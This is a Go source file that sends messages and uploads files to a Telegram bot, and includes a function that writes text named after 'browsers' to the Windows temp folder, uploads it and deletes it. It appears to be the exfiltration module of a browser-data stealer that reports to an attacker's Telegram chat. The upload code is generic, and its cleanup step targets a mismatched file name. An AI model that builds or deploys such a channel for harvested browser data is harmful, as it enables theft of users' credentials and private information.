package scripts

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io"
	"mime/multipart"
	"net/http"
	"os"
	"path/filepath"
)

func SendTelegramMessage(message string) bool {

	chat_id, token := GetConfig()

	url := fmt.Sprintf("https://api.telegram.org/bot%s/sendMessage", token)
	payload := map[string]interface{}{
		"text":       message,
		"chat_id":    chat_id,
		"parse_mode": "HTML",
	}
	body, _ := json.Marshal(payload)

	req, _ := http.NewRequest("POST", url, bytes.NewBuffer(body))
	req.Header.Set("Content-Type", "application/json")

	client := &http.Client{}
	res, _ := client.Do(req)
	defer res.Body.Close()

	if res.StatusCode == 200 {
		return true
	} else {
		return false
	}

}
func SendTelegramDocuments(documents string) bool {

	var requestBody bytes.Buffer
	chat_id, token := GetConfig()

	url := fmt.Sprintf("https://api.telegram.org/bot%s/sendDocument", token)

	file, _ := os.Open(documents)
	defer file.Close()

	writer := multipart.NewWriter(&requestBody)
	part, _ := writer.CreateFormFile("document", filepath.Base(documents))

	_, _ = io.Copy(part, file)
	_ = writer.WriteField("chat_id", chat_id)

	err := writer.Close()
	if err != nil {
		return false
	}

	req, _ := http.NewRequest("POST", url, &requestBody)
	req.Header.Set("Content-Type", writer.FormDataContentType())

	client := &http.Client{}
	res, _ := client.Do(req)

	defer res.Body.Close()

	if res.StatusCode == 200 {
		return true
	} else {
		return false
	}

}

func SendTelegramBrowsersDocuments(name string, text string) {

	tempPath := GetTempPath()

	create, _ := os.Create(fmt.Sprintf("%s\\%s", tempPath, name))
	create.WriteString(text)

	SendTelegramDocuments(fmt.Sprintf("%s\\%s", tempPath, name))
	os.Remove(fmt.Sprintf("%s\\%s.txt", tempPath, name))

}
